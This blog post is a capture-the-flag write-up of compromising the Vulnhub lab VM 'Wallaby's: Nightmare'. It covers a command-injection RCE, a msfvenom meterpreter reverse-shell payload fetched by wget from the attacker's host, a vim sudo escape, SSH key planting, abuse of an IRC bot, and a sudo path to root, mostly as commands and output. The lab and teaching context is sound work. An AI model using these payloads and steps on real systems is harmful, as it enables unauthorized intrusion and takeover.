+++
author = "Chris Suttles"
categories = ["CTF", "vulnhub", "pentesting", "security", "BootToRoot", "offsec"]
date = 2019-05-05T22:06:22Z
description = ""
draft = false
cover = "/images/2019/05/Screen-Shot-2019-05-05-at-9.39.23-AM.png"
slug = "wallabys-nightmare-1-02"
tags = ["CTF", "vulnhub", "pentesting", "security", "BootToRoot", "offsec"]
title = "Wallaby's: Nightmare (v1.0.2)"

+++


I got together with my buddies, and we did another "boot to root" [Vulnhub](https://www.vulnhub.com/) box. This time, we did ["Wallaby's: Nightmare (v1.0.2)"](https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/)

# Author Blurb

> This is my first boot2root machine. It's beginner-intermediate level.
> It's been tested in VBox and VMware and seems to work without issues in both.
> A tip, anything can be a vector, really think things through here based on how the machine works. Make a wrong move though and some stuff gets moved around and makes the machine more difficult!
> This is part one in a two part series. I was inspired by several vms I found on vulnhub and added a bit of a twist to the machine.
> Good luck and I hope you guys enjoy!
> This is my first CTF/Vulnerable VM ever. I created it both for educational purposes and so people can have a little fun testing their skills in a legal, pentest lab environment.
> Some notes before you download!
> Try to use a Host-Only Adapter. This is an intentionally vulnerable machine and leaving it open on your network can have bad results.
> It should work with Vmware flawlessly. I've tested it with vbox and had one other friend test it on Vbox as well so I think it should work just fine on anything else.
> This is a Boot2Root machine. The goal is for you to attempt to attempt to gain root privileges in the VM. Do not try to get the root flag through a recovery iso etc, this is essentially cheating! The idea is to get through by pretending this machine is being attacked over a network with no physical access.
> I themed this machine to make it feel a bit more realistic. You are breaking into a fictional characters server (named Wallaby) and trying to gain root without him noticing, or else the difficulty level will increase if you make the wrong move! Good luck and I hope you guys enjoy!
> Changelog v1.0 - 2016-12-22 - First Release. v1.0.1 - 2016-12-29 - VM was made harder with various fixes. v1.0.2 - 2016-12-30 - Removed a left over temp file that could be used as a
> shortcut.

## Pre-Game

Once again, we all created host entries, this time for `wallaby` and `target`.  You'll see the, used interchangeably during this post, and also see the IP change in output, but we are all just targeting the same vulnerable VM with slightly different isolated networks.

This CTF mentions the increase in difficulty if you are detected, so we also took a snapshot before starting so that we would have the option to revert and try again if we made things get too difficult. Both of these are just simple "best practice" things we do to make the process easy and fun.

## Enumeration

Again, the first step is enumeration.

### NMAP

Let's get into it with nmap:

{{< highlight markdown >}}
msf5 > db_nmap -sV -O -A  -T5 -Pn -p- target
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 14:20 EDT
[*] Nmap: Nmap scan report for target (192.168.167.133)
[*] Nmap: Host is up (0.0013s latency).
[*] Nmap: Not shown: 65532 closed ports
[*] Nmap: PORT     STATE    SERVICE VERSION
[*] Nmap: 22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
[*] Nmap: |   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
[*] Nmap: |_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
[*] Nmap: 80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Wallaby's Server
[*] Nmap: 6667/tcp filtered irc
[*] Nmap: MAC Address: 00:0C:29:41:F1:35 (VMware)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X|4.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
[*] Nmap: OS details: Linux 3.2 - 4.9
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   1.29 ms target (192.168.167.133)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
msf5 > hosts
Hosts
=====
address          mac                name      os_name  os_flavor  os_sp  purpose  info  comments
-------          ---                ----      -------  ---------  -----  -------  ----  --------
192.168.167.133  00:0c:29:41:f1:35  target  Linux               3.X    server
msf5 > services
Services
========
host             port  proto  name  state     info
----             ----  -----  ----  -----     ----
192.168.167.133  22    tcp    ssh   open      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 Ubuntu Linux; protocol 2.0
192.168.167.133  80    tcp    http  open      Apache httpd 2.4.18 (Ubuntu)
192.168.167.133  6667  tcp    irc   filtered

{{< / highlight >}}

### HTTP

Since there's only two services that are fully open (HTTP and SSH), we started with HTTP to try and get a foothold.

### Nikto

A nikto scan quickly caused port 80 to be closed!

{{< highlight markdown >}}

root@kali:~# nikto -host target
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.167.133
+ Target Hostname:    target
+ Target Port:        80
+ Start Time:         2019-05-01 20:09:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated:  20 error(s) and 6 item(s) reported on remote host
+ End Time:           2019-05-01 20:09:21 (GMT-4) (5 seconds)
---------------------------------------------------------------------------

{{< / highlight >}}

In further exploration, we would eventually figure out that it was this request that caused the port to close:

{{< highlight markdown >}}

 + /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)

{{< / highlight >}}

The blurb mentions that the machine becomes more difficult if you make a misstep. I think that's debatable, but we will get to the details shortly. For now, let's continue enumeration.

## Manual

We started doing more manual exploration, beginning with a revisit to the source of '`/`'. The following script and title is all over the place and is snipped out of later examples in this post.

{{< highlight markdown >}}

<title>Wallaby's Server</title>
<script>function post(path, params, method) {
method = method || "post"; // Set method to post by default if not specified.
// The rest of this code assumes you are not using a library.
// It can be made less wordy if you use one.
var form = document.createElement("form");
form.setAttribute("method", method);
form.setAttribute("action", path);
for(var key in params) {
if(params.hasOwnProperty(key)) {
var hiddenField = document.createElement("input");
hiddenField.setAttribute("type", "hidden");
hiddenField.setAttribute("name", key);
hiddenField.setAttribute("value", params[key]);
form.appendChild(hiddenField);
}
}
document.body.appendChild(form);
form.submit();
}
</script>
<h5>Enter a username to get started with this CTF! </h5> <br /><form name="nickname" action="" method="post">
<input type="text" name="yourname" value="" />
<input type="submit" name="submit" value="Submit" />
</form>

{{< / highlight >}}

The next thing I decided to do was to click through, and see what we could find.

{{< highlight markdown >}}

Your username for this ctf is ctlfish
click here to change your username:
Welcome to the Wallaby's Worst Knightmare 2 part series VM.
A few tips.
1. Fuzzing is your friend.
2. Tmux can be useful for many things.
3. Your environment matters.
Good luck and have fun! -Waldo
Start the CTF!

{{< / highlight >}}

So now I did the obvious thing and clicked "Start the CTF!"

{{< highlight markdown >}}
What the heck is this? Some guy named ctlfish is trying to penetrate my server? Loser must not know I'm the great Wallaby!
Let's observe him for now, maybe I could learn about him from his behavior. 

{{< / highlight >}}

We took a look at the source, and it's very similar to the landing page.

{{< highlight markdown >}}

<html><head><title>Wallaby's Server</title>
...
</head><body><p style="text-align:center;">What the heck is this?  Some guy named <em>ctlfish
</em> is trying to penetrate my server?  Loser must not know I'm the great Wallaby!</p>
<br><p style="text-align:center;">Let's <strong><em>observe</em></strong> him for now, maybe I could learn about him from his behavior. <br>
<img src="/eye.jpg"></p></body></html>

{{< / highlight >}}

We grabbed the image and "Giuseppe" and "SteveyDevey" examined it with strings and tried some brute force attacks with steghide, but it turned out to be a dead end.

I continued manually exploring via the form, and started to see some interesting things. When I tried a local file inclusion to grab /etc/passwd, I got a snarky response from wallaby.

{{< highlight markdown >}}

root@kali:~/src/wallaby# curl  http://wallaby/?page=../../../etc/passwd
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash<!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here ?-->
root@kali:~/src/wallaby# 

{{< / highlight >}}

We also tried a different file inclusion, with a URL we discovered via dirb, and got a different snarky message, which also changed the behavior of the machine!

{{< highlight markdown >}}

root@kali:~/src/wallaby# curl target/?page=.git/config
...
<h2>That's some fishy stuff you're trying there <em></em>buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...</h2>
         <br />(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)
root@kali:~/src/wallaby# 

{{< / highlight >}}

After this response, port 80 stopped responding. "Matato" enumerated with nmap again, and discovered that apache had moved to port 60080. Remember how scanning with `nikto` caused port 80 to close? It was a similar query. "Matato" reverted a couple times and confirmed the cause.

> Triggered LFI alert (using '/' in ?path=<location> triggers if it doesn't contain /etc/passwd)
`curl "http://wallaby/?page=/admin"`

Here's the new nmap output after triggering the change

{{< highlight markdown >}}

msf5 > db_nmap -sV -O -A -T3 -p- wallaby
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 22:08 EDT
[*] Nmap: Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
[*] Nmap: Service scan Timing: About 50.00% done; ETC: 22:09 (0:00:11 remaining)
[*] Nmap: Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
[*] Nmap: Service scan Timing: About 100.00% done; ETC: 22:08 (0:00:00 remaining)
[*] Nmap: Nmap scan report for wallaby (192.168.56.105)
[*] Nmap: Host is up (0.0011s latency).
[*] Nmap: Not shown: 65532 closed ports
[*] Nmap: PORT  	STATE	SERVICE VERSION
[*] Nmap: 22/tcp	open 	ssh 	OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
[*] Nmap: |   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
[*] Nmap: |_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
[*] Nmap: 6667/tcp  filtered irc
[*] Nmap: 60080/tcp open 	http	Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Wallaby's Server
[*] Nmap: MAC Address: 08:00:27:ED:DF:AC (Oracle VirtualBox virtual NIC)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X|4.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
[*] Nmap: OS details: Linux 3.2 - 4.9
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT 	ADDRESS
[*] Nmap: 1   1.13 ms wallaby (192.168.56.105)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds

{{< / highlight >}}

### Fuzzing

We did some fuzzing with wfuzz, and started to see some patterns in the output. By now, we were working the script directly, a php router, and knew what happens when we try a LFI. I saw a pattern in wfuzz and removed the slew of results that had the same number of words, and this got a list of URLs that actually did something unique.

{{< highlight markdown >}}

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 target/?page=FUZZ | grep -v 891

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://target/?page=FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000224:  C=200     26 L       86 W          895 Ch        "contact"
000415:  C=200     29 L      122 W         1179 Ch        "home"
000438:  C=200     30 L      104 W         1053 Ch        "index"

Total time: 2.737638
Processed Requests: 950
Filtered Requests: 0
Requests/sec.: 347.0143


{{< / highlight >}}

We started to examine these more closely, and although triggering the LFI response moves the apache instance, once that happens you can just hammer it without any additional consequence, so that's what "Matato" did.

First, there's a telling change in the generic response once apache moves to 60080

{{< highlight markdown >}}

curl http://wallaby:60080/
<title>Wallaby's Server</title>
...
<p style="text-align:center;">HOLY MOLY, this guy <em></em>wants me...Glad I moved to a different port so I could work more securely!!!</p>
<br /><p style="text-align:center;">As we all know, <strong><em>security by obscurity</em></strong> is the way to go...<br />
<img src="/sec.png"/></p>

{{< / highlight >}}

Around this time, everybody was racing with their favorite fuzzer to figure out what vectors were available. "Matato" dropped a list of pages in our notes, which included the "mailer" page.

{{< highlight markdown >}}

# dirb http://wallaby:60080/?page= /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May  1 22:14:23 2019
URL_BASE: http://wallaby:60080/?page=
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                    	 

---- Scanning URL: http://wallaby:60080/?page= ----
+ http://wallaby:60080/?page=blacklist (CODE:200|SIZE:986)                                         	 
+ http://wallaby:60080/?page=cgi-bin/ (CODE:200|SIZE:892)                                          	 
+ http://wallaby:60080/?page=contact (CODE:200|SIZE:895)                                           	 
+ http://wallaby:60080/?page=home (CODE:200|SIZE:1139)                                             	 
+ http://wallaby:60080/?page=index (CODE:200|SIZE:1053)                                            	 
+ http://wallaby:60080/?page=mailer (CODE:200|SIZE:1077)


{{< / highlight >}}

With some manual inspection of the mailer page, I found our entry point

{{< highlight markdown >}}

root@kali:~/wallaby# curl  'http://wallaby/?page=mailer&mail=id'
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<h2 style='color:blue;'>Coming Soon guys!</h2>
<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
<!--Better finish implementing this so  can send me all his loser complaints!-->

{{< / highlight >}}

We have remote command execution!

{{< highlight markdown >}}

root@kali:~/wallaby# curl  'http://wallaby/?page=mailer&mail=ls%20-R'
...
.:
eye.jpg
index.php
levelone.txt
s13!34g$3FVA5e@ed
sec.png
./s13!34g$3FVA5e@ed:
althome.php
blacklist.php
contact.php
first_visit.php
home.php
honeypot.php
index.php
mailer.php
welcome.php
...

{{< / highlight >}}

We tinkered with this manually to explore things, getting a list of running processes and so on. It didn't take long for that to become tedious, so we whipped up a trivial Python script to make things easier.

{{< highlight markdown >}}

root@kali:~/wallaby# cat ~/src/wallaby/pcurl.py 
#!/usr/bin/env python3

import argparse
import urllib.parse
import requests

parser = argparse.ArgumentParser()
parser.add_argument("--command", "-c", help="command to encode in URL-friendly format")
parser.add_argument("--sendit", "-s", help="send the request", action='store_true')

args = parser.parse_args()

html_form_value = urllib.parse.quote_plus(args.command)

if args.sendit:
    baseurl = 'http://wallaby/?page=mailer&mail='
    url = baseurl + html_form_value
    r = requests.get(url)
    print(r.text, "\n", r.status_code)
else:
    print(html_form_value)

{{< / highlight >}}

## Getting a Foothold

Now we have a vector for attack, and we need to get a more firm foothold as the www-data user. First we tried to attack PHP, because it's PHP, and appeared to be an older version, and possibly misconfigured. We didn't make much progress though, even though it was now _very easy_ to run commands against the box.

{{< highlight markdown >}}

root@kali:~/wallaby# ~/src/wallaby/pcurl.py -s -c 'ls -lR'
...
.:
total 544
-rw-r--r-- 1 root     root      15953 Aug 11  2015 eye.jpg
-rw-r--r-- 1 root     root       3639 Dec 27  2016 index.php
-rw-r--r-- 1 root     root          0 Dec 27  2016 levelone.txt
drwxr-xr-x 2 root     root       4096 Dec 27  2016 s13!34g$3FVA5e@ed
-rw-r--r-- 1 root     root      57626 Dec 27  2016 sec.png
./s13!34g$3FVA5e@ed:
total 36
-rw-r--r-- 1 root root  339 Dec 27  2016 althome.php
-rw-r--r-- 1 root root  698 Dec 27  2016 blacklist.php
-rw-r--r-- 1 root root   78 Dec 16  2016 contact.php
-rw-r--r-- 1 root root  371 Dec 16  2016 first_visit.php
-rw-r--r-- 1 root root  379 Dec 16  2016 home.php
-rw-r--r-- 1 root root 1350 Dec 27  2016 honeypot.php
-rw-r--r-- 1 root root  213 Dec 15  2016 index.php
-rw-r--r-- 1 root root  461 Dec 16  2016 mailer.php
-rw-r--r-- 1 root root  667 Dec 16  2016 welcome.php
<h2 style='color:blue;'>Coming Soon guys!</h2>
<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
<!--Better finish implementing this so  can send me all his loser complaints!-->
200
root@kali:~/wallaby# 

{{< / highlight >}}

## Getting a Meterpreter Shell

It was time to stop messing around and get into this thing, so here's a step by step of how to get a meterpreter shell on this box as the `www-data` user.

### First we make a payload

{{< highlight markdown >}}

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.167.130 LPORT=4444 -f elf -e x86/shikata_ga_nai -a x86 --platform linux -o revshell

{{< / highlight >}}

There's a lot going on there; what, exactly, is this command?

-p specifies the payload we are making a linux, x86 payload for a meterpreter reverse shell over tcp

LHOST, LPORT are variables for this payload (and standard for all metasploit) LHOST is the listen host LPORT is the listen port (atack box).

-f format is elf (linux binary)

-e encoder is x86/shikata_ga_nai - I believe it is the best choice for an encoder unless you have a good reason to use a different one or know more about encoders than me (not hard!)

"SteveyDevey" is multi-lingual, and passionate about languages; he pointed out that "Shikata ga nai" means "it can't be helped" in Japanese and is a commonly used to describe acceptance in the wake of things that are uncontrollable or unavoidable [https://en.wikipedia.org/wiki/Shikata_ga_nai](https://en.wikipedia.org/wiki/Shikata_ga_nai) 

-a arch is x86 (target)

--platform is linux (target)

-o <filename> (name of our payload file)

### Drop the Payload on the Target

After creating a payload, from the directory where your payload is, run

`python3 -m http.server 8000 &`

Next, fetch the payload from yourself, and chmod it to make executable.

{{< highlight markdown >}}
~/src/wallaby/pcurl.py -s -c 'wget 192.168.167.130:8000/revshell'
~/src/wallaby/pcurl.py -s -c 'chmod a+x revshell'

{{< / highlight >}}

### Start a local handler

For the next step, we use the exploit/multi/handler module. It is crucial to set the payload options to match _exactly_ what was generated with msfvenom. Then simply run via `run` or `exploit`

{{< highlight markdown >}}

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp        
msf5 exploit(multi/handler) > options                       
                                               
Module options (exploit/multi/handler):                                                      
                                               
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------                                         
                                                                                  
                                                                                                                    
Payload options (linux/x86/meterpreter/reverse_tcp):                 
6                                                                     
   Name   Current Setting  Required  Description      
   ----   ---------------  --------  ----------- 
   LHOST                   yes       The listen address (an interface may be specified)                              
   LPORT  4444             yes       The listen port
                                                       
                                                                                
Exploit target:                                                  
                                                               
   Id  Name                                     
   --  ----                               
   0   Wildcard Target                      
                                                      
                                              
msf5 exploit(multi/handler) > set LHOST 192.168.167.130
LHOST => 192.168.167.130
msf5 exploit(multi/handler) > run

{{< / highlight >}}

### Call the exploit and watch your meterpreter shell

In another terminal, run the following command to remotely execute our staged payload.

{{< highlight markdown >}}


root@kali:~/wallaby# ~/src/wallaby/pcurl.py -s -c './revshell'  

{{< / highlight >}}

Back in msfconsole, we see the target connect to our handler.

{{< highlight markdown >}}

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.167.130:4444
[*] Sending stage (985320 bytes) to 192.168.167.133
[*] Meterpreter session 1 opened (192.168.167.130:4444 -> 192.168.167.133:47150) at 2019-05-02 09:15:32 -0400

meterpreter > getuid
Server username: uid=33, gid=33, euid=33, egid=33
meterpreter >

{{< / highlight >}}

Congratulations! You've got a meterpreter shell! :D

# Escalating Privileges

Now that we've got a meterpreter shell as the `www-data` user, we were able to do some exploring. We downloaded php files for examination, and checked out what sudo commands were available to the `www-data` user.

{{< highlight markdown >}}

meterpreter > channel -i 2
Interacting with channel 2...


whoami
www-data
sudo -l 
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables

{{< / highlight >}}

This shows us how to become the user `waldo` with a vim escape from a `www-data` shell.

## Becoming waldo, another user with better access

With the information we just gathered, as `www-data`, we run the following command `sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf`Once vim, opens we escape to a shell by hitting Esc, followed by:

`:shell`Now we are waldo, as we can see in the following commands

{{< highlight markdown >}}

whoami
waldo
id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

{{< / highlight >}}

We still have a terrible shell though, because `shell -t` as the `www-data` user failed from meterpreter (and we had to fallback to just `shell`); this is because `www-data` user is not allowed to have a tty. Now that we have access as the user `waldo`, let's get a tty.

## Getting a Real Terminal

To do this, we make the .ssh directory in waldo's home, echo out an ssh pubkey to the `~waldo/.ssh/authorized_keys` and chown it 600. Now we can simply ssh as `waldo`.

{{< highlight markdown >}}

root@kali:~# ssh waldo@wallaby 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu May  2 18:11:36 2019 from 192.168.167.130
waldo@ubuntu:~$ 
{{< / highlight >}}

## What Can Waldo Do?

While doing our initial exploration, remember how we found some tips?

{{< highlight markdown >}}

Welcome to the Wallaby's Worst Knightmare 2 part series VM.
A few tips.
1. Fuzzing is your friend.
2. Tmux can be useful for many things.
3. Your environment matters.
Good luck and have fun! -Waldo
Start the CTF!

{{< / highlight >}}

The tips for this CTF included a hint about tmux being useful. Once we become `waldo`, it's easy to see what he is running, since there is a script for running irssi in waldo's home directory. That script starts irssi in a tmux session.

{{< highlight markdown >}}

waldo@ubuntu:~$ cat irssi.sh 
#!/bin/bash
tmux new-session -d -s irssi
tmux send-keys -t irssi 'n' Enter
tmux send-keys -t irssi 'irssi' Enter

{{< / highlight >}}

Running `tmux list-sessions` shows only the single session named `irssi`, so we attached to it and started to explore.

### How do I irssi?

We spent some time remembering how to use irssi. I haven't run it for years, even though it used to be a daily driver. Eventually we remembered how to list windows, and found `#wallabyschat`.

{{< highlight markdown >}}

18:06 -!- waldo [waldo@wallaby-DCED2AAD] has joined #wallabyschat
18:06 [Users #wallabyschat]
18:06 [@waldo] 
18:06 -!- Irssi: #wallabyschat: Total of 1 nicks [1 ops, 0 halfops, 0 voices, 0 normal]
18:06 -!- Channel #wallabyschat created Wed May  1 18:06:18 2019
18:06 -!- Irssi: Join to #wallabyschat was synced in 7 secs
18:06 -!- wallabysbot [sopel@wallaby-DCED2AAD] has joined #wallabyschat

{{< / highlight >}}

"SteveyDevey" noticed the join message for `wallabysbot`. We played around with the bot and found the `.run` command, which failed on anything other than single arg invocations, but also runs those things as wallaby, which we confirmed by running `id`.

## Becoming Wallaby

"Matato" did some excellent research on the module, first by exploring the system and finding the module (which is custom, and located in wallaby's home directory), and then digging through the [sopel source](https://github.com/sopel-irc/sopel/blob/master/sopel/trigger.py) to understand the stuff the module inherited via decorators.

So, after digging a bit with irssi,  wallaby's `.run` custom sopel module will only accept a single arg. This is because `trigger.group(2)` is the a python regex object `match.group` that's part of the [sopel framework](https://sopel.chat/tutorials/part-1-writing-modules/), which defines `trigger.group(2)` as "anything after the command" (as in the command to the bot). So our module won't accept any sort of command with multiple args, because the string in `trigger.group(2)` is passed to this simple module, which uses the old `'%s'` style of python string formatting when it, in turn, calls `os.system()` and also `subprocess.Popen()`, which both need tokenization of args, not just a raw string. We tried faking the format of our commands in [the format expected](https://docs.python.org/3/library/subprocess.html#subprocess.run), but that didn't work. We took a break because it was late and we all had real life stuff to do the next day.

{{< highlight markdown >}}

waldo@ubuntu:/home/wallaby/.sopel/modules$ cat run.py 
import sopel.module, subprocess, os
from sopel.module import example

@sopel.module.commands('run')
@example('.run ls')
def run(bot, trigger):
     if trigger.owner:
          os.system('%s' % trigger.group(2))
          runas1 = subprocess.Popen('%s' % trigger.group(2), stdout=subprocess.PIPE).communicate()[0]
          runas = str(runas1)
          bot.say(' '.join(runas.split('\\n')))
     else:
          bot.say('Hold on, you aren\'t Waldo?')

{{< / highlight >}}

I was thinking about this before bed, and thought we might be overthinking it. What about a much simpler solution? I dropped this idea in our shared notes.

> Maybe we can create a shell script in a location Waldo can access, make it 777 and then run it as wallaby with the single arg bot invocation of .run as waldo?

In the morning,"Matato" lit up our chat after he ran with the idea to create a script and run it as the single arg to `.run` so that `waldo` can execute code as `wallaby`. Here's my script. "Matato", independently did the nearly the exact same thing; he beat me in the keyboard race. :)

{{< highlight markdown >}}

waldo@ubuntu:~$ cat test 
#!/bin/bash
sudo -l
mkdir /home/wallaby/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2NNNICETRYMORTY9a42+m7rFv root@kali" >> /home/wallaby/.ssh/authorized_keys
chmod 600 /home/wallaby/.ssh/authorized_keys

{{< / highlight >}}

I thought we might need to put this in a neutral place like `/var/www/html` or something, but because the permissions on home are `755` instead of `700`, we can just run this from `waldo`'s home!

{{< highlight markdown >}}

22:03 < waldo> .run /home/waldo/test
22:03 < wallabysbot> b'Matching Defaults entries for wallaby on ubuntu:     env_reset, mail_badpass, 
                     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User wallaby may run the following commands on ubuntu:     
                     (ALL) NOPASSWD: ALL '

{{< / highlight >}}

This appended our key do wallaby's home, so now we just ssh as `wallaby` and `sudo su -`!

## Flag

{{< highlight markdown >}}

root@kali:~# ssh wallaby@wallaby 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri May  3 12:43:17 2019 from 192.168.167.130
wallaby@ubuntu:~$ sudo su -
root@ubuntu:~# ls -l 
total 12
drwxr-xr-x 2 root root 4096 Dec 27  2016 backups
-rwxr-xr-x 1 root root  510 Dec 27  2016 check_level.sh
-rw-r--r-- 1 root root  342 Dec 16  2016 flag.txt
root@ubuntu:~# cat flag.txt 
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
root@ubuntu:~# 
{{< / highlight >}}

## Recap

This box is exploitable through a series of flaws, some big, some small.

1. PHP exploit via poorly written page which includes an tainted `system()` call
2. sudo misconfiguration that allows the `www-data` user to run vim as `waldo`, and escape to a shell
3. irssi bot weakness allows user `waldo` to run commands as `wallaby`
4. bad permissions on user dirs in home (755 instead of 700)
5. another sudo misconfiguration that allows `wallaby` to run anything without a password

These flaws together are bigger than the sum of their parts. This box was a lot of fun for us and a great reminder why adhering to some classic UNIX/Linux best practices is important. Here's some key takeaways for when you are on the [blue team](https://danielmiessler.com/study/red-blue-purple-teams/):

* Don't trust input - treat all user data as tainted. It should only execute prepared statements.
* Weak permissions are dangerous
